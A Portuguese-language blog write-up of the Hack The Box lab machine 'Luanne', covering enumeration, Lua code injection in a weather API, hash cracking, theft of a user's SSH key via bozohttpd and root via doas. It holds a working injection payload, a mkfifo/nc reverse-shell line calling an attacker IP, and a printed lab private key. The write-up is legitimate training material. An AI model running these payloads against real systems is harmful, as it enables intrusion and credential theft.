---
layout: single
title: "Hackthebox write-up: Luanne"
namespace: htb-luanne
category: Writeup
tags: HackTheBox htb-easy htb-linux
date: 2021-03-27 12:00:00
header:
   teaser: https://i.imgur.com/8bsXO5e.png
---

Olá pessoal!

A máquina desta semana será **Luanne**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), , criada por [polarbearer](https://app.hackthebox.eu/users/159204).<!--more-->

:information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
{: .notice--info}

![HTB Luanne](https://i.imgur.com/H8PyuHc.png){: .align-center}

## Enumeração

Iniciado enumeração, como de costume, executando um scan rápido com o `nmap` para identificar os serviços publicados:

```bash
$ nmap -sC -sV -Pn -oA quick 10.10.10.218
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-19 13:35 -03
Nmap scan report for 10.10.10.218
Host is up (0.15s latency).
Not shown: 997 closed ports
PORT STATE SERVICE VERSION
22/tcp open ssh OpenSSH 8.0 (NetBSD 20190418-hpn13v14-lpk; protocol 2.0)
| ssh-hostkey:
| 3072 20:97:7f:6c:4a:6e:5d:20:cf:fd:a3:aa:a9:0d:37:db (RSA)
| 521 35:c3:29:e1:87:70:6d:73:74:b2:a9:a2:04:a9:66:69 (ECDSA)
|_ 256 b3:bd:31:6d:cc:22:6b:18:ed:27:66:b4:a7:2a:e4:a5 (ED25519)
80/tcp open http nginx 1.19.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_ Basic realm=.
| http-robots.txt: 1 disallowed entry
|_/weather
|_http-server-header: nginx/1.19.0
|_http-title: 401 Unauthorized
9001/tcp open http Medusa httpd 1.12 (Supervisor process manager)
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_ Basic realm=default
|_http-server-header: Medusa/1.12
|_http-title: Error response
Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 208.02 seconds
```

## 80/TCP - Serviço HTTP

Ao acessar a página inicial do serviço foi solicitada autenticação, para a qual não temos nenhum tipo de credencial até o momento. Um ponto que chama a atenção é o link para a porta 3000/TCP do localhost, sendo que estamos acessando de uma porta 80/TCP, provavelmente através de um proxy.

![HTB Luanne - 3000/TCP](https://i.imgur.com/29kTezx.png){: .align-center}

De acordo com o scan do `nmap`, existe uma entrada no arquivo `robots.txt`. Ao validá-lo integralmente encontramos uma informação importante sobre um diretório virtual `/weather`

```bash
$ curl -L http://10.10.10.218/robots.txt
User-agent: *
Disallow: /weather #returning 404 but still harvesting cities
```

Com este dado podemos inferir que, mesmo com os errors 404, ainda deve existir algum serviço onde possamos realizar as consultas a respeito do tempo.

### Gobuster

Executando o `gobuster` em modo diretório, pude identificar o caminho **forecast**, que foi chave para conseguirmos prosseguir nesta máquina:

```bash
$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.218/weather/ -o gosbuter-80-weather.txt -t 50
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url: http://10.10.10.218/weather/
[+] Threads: 50
[+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes: 200,204,301,302,307,401,403
[+] User Agent: gobuster/3.0.1
[+] Timeout: 10s
===============================================================
2021/02/19 14:50:37 Starting gobuster
===============================================================
/forecast (Status: 200)
Progress: 68993 / 220561 (31.28%)
```

Em uma chamada utilizando o `curl` faltando parámetros, recebemos um "manual" de como utilizar a API, onde temos a opção de listar o clima pra cidades específicas implementadas.

```bash
$ curl -L http://10.10.10.218/weather/forecast
{"code": 200, "message": "No city specified. Use 'city=list' to list available cities."}
$ curl -L http://10.10.10.218/weather/forecast?city=list
{"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}
  
$ curl -L http://10.10.10.218/weather/forecast?city=London
{"code": 200,"city": "London","list": [{"date": "2021-02-19","weather": {"description": "snowy","temperature": {"min": "12","max": "46"},"pressure": "1799","humidity": "92","wind": {"speed": "2.1975513692014","degree": "102.76822959445"}}},{"date": "2021-02-20","weather": {"description": "partially cloudy","temperature": {"min": "15","max": "43"},"pressure": "1365","humidity": "51","wind": {"speed": "4.9522297247313","degree": "262.63571172766"}}},{"date": "2021-02-21","weather": {"description": "sunny","temperature": {"min": "19","max": "30"},"pressure": "1243","humidity": "13","wind": {"speed": "1.8041767538525","degree": "48.400944394059"}}},{"date": "2021-02-22","weather": {"description": "sunny","temperature": {"min": "30","max": "34"},"pressure": "1513","humidity": "84","wind": {"speed": "2.6126398323104","degree": "191.63755226741"}}},{"date": "2021-02-23","weather": {"description": "partially cloudy","temperature": {"min": "30","max": "36"},"pressure": "1772","humidity": "53","wind": {"speed": "2.7699138359167","degree": "104.89152945159"}}}]}
```

Embora seja possível consultar as informações nesta API, não consegui identificar nenhum detalhe adicional de como converter essa API de consulta para alguma execução remota de código e decidi seguir para o próximo serviço disponível nesta máquina.

### 9001/TCP - Serviço HTTP

Buscando por `Medusa httpd 1.12 (Supervisor process manager)` encontrei que o serviço provavelmente se trata da aplicação [**Supervisor**](https://github.com/Supervisor/supervisor). Buscando pelas credenciais padrão na página do projeto encontrei **user:123**, as quais permitiram o acesso no portal e exibiu a página abaixo:

![HTB Luanne - Supervisor](https://i.imgur.com/2fSp0Lx.png){: .align-center}

Com isso podemos observar que a versão do supervisor em execução é  a **4.2.0**, que em uma busca rápida não retornou nenhuma vulnerabilidade conhecida.

Clicando em cada um dos recursos disponíveis, um item interessante chamou atenção: o link **processes**. Ao acessar as informações ali disponíveis um processo em execução na máquina chamou atenção, frente ao que identificamos no item anterior:

```plaintext
_httpd 376 0.0 0.0 34956 2020 ? Is 5:56AM 0:00.13 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3000 -L weather /usr/local/webapi/weather.lua -U _httpd -b /var/www
```

Pelo que pudemos identificar a API que estivemos consultando a pouco publicada na porta 80/TCP se trata de um aplicativo desenvolvido em [LUA](https://www.lua.org/start.html), uma linguagem de programação desenvolvida pela Universidade PUC-RJ.

## Acesso inicial

Uma vez que sabemos que a API é desenvolvida em LUA, após algumas pesquisas, encontrei [este artigo](https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities) que descreve algumas formas de explorar aplicações escritas em LUA a partir de code injection e, após alguns testes, consegui algo que poderia nos levar a um acesso inicial nesta máquina.

:bulb: **Note**: O segredo está na codificação do conteúdo passado nos requests, logo, a forma mais simples encontrada foi utilizar o próprio `curl` com alguns parâmetros conforme listado abaixo, simplificando o processo de *escaping* dos caracteres utilizados no payload.:
{: .notice--info}

A injeção final, que permitiu execução remota de código na máquina foi o resultado abaixo:

```bash
$ curl -G --data-urlencode "city=London') os.execute('ls -la') x=('" http://10.10.10.218/weather/forecast
{"code": 500,"error": "unknown city: Londontotal 20
drwxr-xr-x 2 root wheel 512 Nov 25 11:27 .
drwxr-xr-x 24 root wheel 512 Nov 24 09:55 ..
-rw-r--r-- 1 root wheel 47 Sep 16 15:07 .htpasswd
-rw-r--r-- 1 root wheel 386 Sep 17 20:56 index.html
-rw-r--r-- 1 root wheel 78 Nov 25 11:38 robots.txt
```

A partir desta execução consegui ler o arquivo `.htpasswd`, que possui o hash da senha para acesso ao website que, utilizando o **john**, consegui crackeá-la a usando o dicionário **rockyou.txt**.

```bash
$ cat .htpasswd
webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
  
$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long .htpasswd
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
iamthebest (webapi_user)
1g 0:00:00:00 DONE (2021-02-19 17:09) 3.571g/s 10628p/s 10628c/s 10628C/s sexy..14789632
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Para obter um shell reverso, executei a seguinte chamada HTTP:

```bash

curl -G --data-urlencode "city=London') os.execute('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f') x=('" http://10.10.10.218/weather/forecast

```

## User flag

Ao executar o `linpeas.sh` observado que o usuário **r.michaels** possui em execução a mesma web API LUA utilizada no acesso inicial. A ideia seria obter um shell reverso com a conta do usuário em questão da mesma forma que o acesso inicial foi obtido, porém a exploração utilizada anteriormente não funcionou conforme esperado. Isso nos leva a crer que esta versão da API foi corrigida, conforme podemos notar também o path **devel** no caminho do arquivo `weather.lua` em execução na chamada.

```plaintext
r.michaels 185 0.0 0.0 34992 1964 ? Is 5:56AM 0:00.00 /usr/libexec/httpd -u -X -s -i 127.0.0.1 -I 3001 -L weather /home/r.michaels/devel/webapi/weather.lua -P /var/run/httpd_devel.pid -U r.michaels
-b /home/r.michaels/devel/www
```

### bozohttpd  

Um ponto que estava passando desapercebido até então é que embora acessássemos a aplicação na porta 80/TCP, ela estava publicada na porta 3000/TCP local. Isso implica que algum proxy estava sendo utilizado para a sua publicação. Esta informação foi confirmada ao validar o cabeçalho da resposta recebida em um request diretamente por dentro da máquina:

```bash
curl -I http://127.0.0.1:3000
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
0 199 0 0 0 0 0 0 --:--:-- --:--:-- --:--:-- 0
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Basic realm="."
Content-Type: text/html
Content-Length: 199
Server: bozohttpd/20190228
Allow: GET, HEAD, POST
```

Pesquisando sobre o bozohttpd, o servidor utilizado para esta publicação, encontrei esta [**man page**](https://man.netbsd.org/NetBSD-7.0/bozohttpd.8) que descreve uma das suas features: *~user translation*, que permite acessar diretórios virtuais dos usuários através de chamada do tipo `http://<server>/~<username>`. Iss foi confirmado a partir da seguinte chaada utilizando o `curl`:  

```bash
curl http://127.0.0.1:3000/~r.michaels -u webapi_user
Enter host password for user 'webapi_user':iamthebest
  
% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 172 0 172 0 0 86000 0 --:--:-- --:--:-- --:--:-- 86000
<html><head><title>Document Moved</title></head>
<body><h1>Document Moved</h1>
This document had moved <a href="http://127.0.0.1:3000/~r.michaels/">here</a>
</body></html>
```

Entretanto, uma vez que a instância na porta 3000 roda com a conta `_httpd`, não temos permissão neste diretório, mas como notamos que existe uma outra instancia na porta 3001 em execução pelo usuário `r.michaels`, pudemos obter o seguinte resultado, onde vemos a existência de um aquivo chamado **id_rsa**

```bash
curl http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user
Enter host password for user 'webapi_user':iamthebest

% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 601 0 601 0 0 293k 0 --:--:-- --:--:-- --:--:-- 586k
<!DOCTYPE html>
<html><head><meta charset="utf-8"/>
<style type="text/css">
table {
border-top: 1px solid black;
border-bottom: 1px solid black;
}
th { background: aquamarine; }
tr:nth-child(even) { background: lavender; }
</style>
<title>Index of ~r.michaels/</title></head>
<body><h1>Index of ~r.michaels/</h1>
<table cols=3>
<thead>
<tr><th>Name<th>Last modified<th align=right>Size
<tbody>
<tr><td><a href="../">Parent Directory</a><td>16-Sep-2020 18:20<td align=right>1kB
<tr><td><a href="id_rsa">id_rsa</a><td>16-Sep-2020 16:52<td align=right>3kB
</table>
</body></html>
```

Ao baixar este arquivo, notamos que se trata de uma chave OpenSSH,  a qual possivelmente nos permitirá logar com a conta `r.michaels` e obter a flag do usuário.

```bash
curl http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user
Enter host password for user 'webapi_user':iamthebest

% Total % Received % Xferd Average Speed Time Time Time Current
Dload Upload Total Spent Left Speed
100 2610 100 2610 0 0 2548k 0 --:--:-- --:--:-- --:--:-- 2548k
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Ao validar a chave RSA existente (`id_rsa`) notei que não se trata de uma chave RSA, mas uma chave `OPENSSH`. Para convertê-la precisei realizar os seguintes procedimentos:

- Remover a quebra de linha ao final do arquivo, após a instrução `-----END OPENSSH PRIVATE KEY-----`.
- Conversão de OpenSSH para RSA usando o comando abaixo, assim como a redefinição das permissões para que pudéssemos utilizá-la com o `ssh`, informando a senha da chave a ser exportada em branco.

```bash
chmod 600 id_rsa
ssh-keygen -p -m PEM -f ./id_rsa
Key has comment 'r.michaels@luanne.htb'
Enter new passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved with the new passphrase.
```

Com esta chave, o acesso com a conta `r.michaels`foi possível, onde obtivemos o flag de usuário.

```bash
ssh -i id_rsa r.michaels@10.10.10.218
The authenticity of host '10.10.10.218 (10.10.10.218)' can't be established.
ECDSA key fingerprint is SHA256:KB1gw0t+80YeM3PEDp7AjlTqJUN+gdyWKXoCrXn7AZo.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
Last login: Sat Feb 20 07:14:11 2021 from 10.10.14.33
NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
  
Welcome to NetBSD!
  
luanne$ id && pwd && ls -la
uid=1000(r.michaels) gid=100(users) groups=100(users)
/home/r.michaels
total 52
dr-xr-x--- 7 r.michaels users 512 Sep 16 18:20 .
drwxr-xr-x 3 root wheel 512 Sep 14 06:46 ..
-rw-r--r-- 1 r.michaels users 1772 Feb 14 2020 .cshrc
drwx------ 2 r.michaels users 512 Sep 14 17:16 .gnupg
-rw-r--r-- 1 r.michaels users 431 Feb 14 2020 .login
-rw-r--r-- 1 r.michaels users 265 Feb 14 2020 .logout
-rw-r--r-- 1 r.michaels users 1498 Feb 14 2020 .profile
-rw-r--r-- 1 r.michaels users 166 Feb 14 2020 .shrc
dr-x------ 2 r.michaels users 512 Sep 16 16:51 .ssh
dr-xr-xr-x 2 r.michaels users 512 Nov 24 09:26 backups
dr-xr-x--- 4 r.michaels users 512 Sep 16 15:02 devel
dr-x------ 2 r.michaels users 512 Sep 16 16:52 public_html
-r-------- 1 r.michaels users 33 Sep 16 17:16 user.txt
luanne$ cat user.txt
<redacted>
```

## Root flag

No home directory do usuário `r.michaels` encontrada uma pasta chamada backups, que contém um arquivo criptografado **devel_backup-2020-09-16.tar.gz.enc**. Para descriptografá-lo precisamos de uma senha ou chave deste usuário.

Executando o script `linpeas.sh` vi alguns insights interessantes que nos ajudariam a encontrar o caminho para o `root`:

- Usuário r.michaels possui acessos **doas** de execução como `root`, equivalentes ao `sudo` em outras distribuições;

```plaintext
[+] Checking doas.conf
permit r.michaels as root
```

- Chave PGP para o app `netpgp`, que permite criptografar, descriptografar e assinar arquivos;
```plaintext
[+] Do I have PGP keys?
gpg Not Found
/usr/bin/netpgpkeys
1 key found
"pub" 2048/"RSA (Encrypt or Sign)" "op" 2020-09-14
Key fingerprint: "027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a "
uid "RSA 2048-bit key <r.michaels@localhost>" ""
```

- Caminhos user writable:

```plaintext
[+] Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
/home/r.michaels
/tmp
/var/mail
/var/mail/r.michaels
/var/shm
/var/spool/sockets
```

Uma vez que ja temos as informações acima, segui com a tentativa descriptografar o arquivo de backup utilizando a chave pgp encontrada. O ponto importante neste item é utilizar um caminho user writable, neste caso o `/var/shm`

```bash
luanne$ netpgp --decrypt --output=/var/shm/devel_backup-2020-09-16.tar.gz devel_backup-2020-09-16.tar.gz.enc
signature 2048/RSA (Encrypt or Sign) 3684eb1e5ded454a 2020-09-14
Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a
uid RSA 2048-bit key <r.michaels@localhost>
```

Analisando o conteúdo do arquivo compactado, vimos que temos os arquivos utilizados para a API e index.html, mas o que chamou a atenção foi o conteúdo do **.htpasswd**, que embora tivesse o mesmo user(*webapi_user*), apresentava uma senha diferente da já encontrada.

```bash
tree -a devel-2020-09-16
devel-2020-09-16
├── webapi
│ └── weather.lua
└── www
├── .htpasswd
└── index.html
```

Utilizando o mesmo método feito para o arquivo anterior, foi encontrada a senha **littlebear**.

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long ./www/.htpasswd
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littlebear (webapi_user)
1g 0:00:00:00 DONE (2021-02-20 16:02) 1.333g/s 17216p/s 17216c/s 17216C/s mirame..limewire
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

Assim como o `sudo`, o `doas` requer que uma senha seja informada, onde **littlebear** funcionou como esperado, permitindo a obtenção da flag de root:

```bash
doas /bin/sh
Password:
# hostname && id
luanne.htb
uid=0(root) gid=0(wheel) groups=0(wheel),2(kmem),3(sys),4(tty),5(operator),20(staff),31(guest),34(nvmm)
# cat /root/root.txt
<redacted>
```

Espero que tenham gostado!

Vejo vocês novamente em breve! :smiley: